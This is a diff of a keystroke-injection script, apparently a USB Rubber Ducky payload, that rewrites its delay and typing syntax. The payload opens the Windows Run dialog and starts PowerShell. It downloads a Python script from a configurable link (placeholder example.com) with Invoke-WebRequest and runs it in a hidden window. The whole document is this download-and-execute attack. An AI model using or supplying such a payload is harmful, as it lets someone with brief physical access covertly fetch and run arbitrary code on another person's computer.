@@ -16,21 +16,13 @@ REM     - ExecutionPolicy Bypass
 
 
 REM REQUIRED - Set your Python script link
-DEFINE SCRIPT-PY-LINK example.com
+DEFINE #SCRIPT-PY-LINK example.com
 
-
-DELAY 1000
+DEFAULT_DELAY 500
 GUI r
-DELAY 500
-STRING powershell
-ENTER
-DELAY 500
+STRINGLN powershell
 
-STRING Invoke-WebRequest -Uri "
-STRING SCRIPT-PY-LINK
-STRING " -OutFile "script.py"
-ENTER
-DELAY 500
+STRINGLN Invoke-WebRequest -Uri "#SCRIPT-PY-LINK" -OutFile "script.py"
 
 STRINGLN Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden
 DELAY 1000
